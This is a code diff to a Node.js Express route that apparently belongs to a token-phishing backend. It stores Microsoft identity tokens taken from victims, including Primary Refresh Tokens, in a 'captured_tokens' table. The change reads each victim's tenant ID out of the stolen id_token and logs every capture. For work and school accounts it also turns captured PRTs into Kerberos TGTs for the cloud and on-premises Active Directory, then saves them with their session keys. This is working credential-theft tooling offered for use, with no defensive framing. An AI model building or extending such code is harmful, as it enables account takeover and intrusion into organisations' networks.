@@ -302,8 +302,9 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
       session_key_enc: sessionKeyEnc,
     };
 
-    // Extract email from id_token if present
+    // Extract email and tenant from id_token if present
     let email = null;
+    let idTokenTenant = null;
     if (id_token) {
         try {
             let tokenPart = id_token.split('.')[1];
@@ -311,6 +312,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
             while (tokenPart.length % 4) tokenPart += '=';
             const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
             email = payload.email || payload.upn || payload.preferred_username || null;
+            idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
 
             // Detect account type from email domain
             if (email) {
@@ -322,14 +324,14 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         } catch (e) { /* ignore decode errors */ }
     }
 
-    // Determine tenant from link's jwt_payload
-    let tenant = 'common';
-    try {
-        if (link.jwt_payload) {
+    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
+    let tenant = idTokenTenant || 'common';
+    if (!idTokenTenant && link.jwt_payload) {
+        try {
             const parsed = JSON.parse(link.jwt_payload);
             if (parsed.tenant) tenant = parsed.tenant;
-        }
-    } catch (e) { /* use default */ }
+        } catch (e) { /* use default */ }
+    }
 
     // For personal accounts, use consumers endpoint
     if (accountType === 'personal') {
@@ -373,14 +375,52 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const tokenId = result.insertId;
 
+    // Log token capture details for debugging
+    console.log('[Capture] Token captured:', {
+      tokenId,
+      email,
+      accountType,
+      tenant,
+      hasPrt: !!prt,
+      hasIdToken: !!id_token,
+      idTokenTenant: idTokenTenant || 'not extracted'
+    });
+
     // Auto-derive Kerberos TGTs for work/school accounts with PRT
     // This runs asynchronously and doesn't block the response
+    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
     if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      console.log('[Capture] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
       const kerberosService = require('../services/kerberos');
       kerberosService.deriveTGTForToken(tokenId)
         .then(derivationResult => {
           if (derivationResult.success) {
             console.log('[Capture] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
+            // Update the token record with Kerberos data
+            if (derivationResult.tgt_cloud) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
+                [encrypt(derivationResult.tgt_cloud), tokenId]
+              ).catch(err => console.error('[Capture] Failed to save TGT cloud:', err));
+            }
+            if (derivationResult.tgt_ad) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
+                [encrypt(derivationResult.tgt_ad), tokenId]
+              ).catch(err => console.error('[Capture] Failed to save TGT AD:', err));
+            }
+            if (derivationResult.session_key) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
+                [encrypt(derivationResult.session_key), tokenId]
+              ).catch(err => console.error('[Capture] Failed to save session key:', err));
+            }
+            if (derivationResult.kerberos_top_level_names) {
+              db.query(
+                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
+                [derivationResult.kerberos_top_level_names, tokenId]
+              ).catch(err => console.error('[Capture] Failed to save kerberos names:', err));
+            }
           } else {
             console.log('[Capture] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
           }
@@ -388,6 +428,11 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         .catch(err => {
           console.error('[Capture] Kerberos derivation error:', err.message);
         });
+    } else {
+      console.log('[Capture] Kerberos derivation skipped:', {
+        tokenId,
+        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
+      });
     }
 
     // Common capture data shared by both the token-only and cookie paths
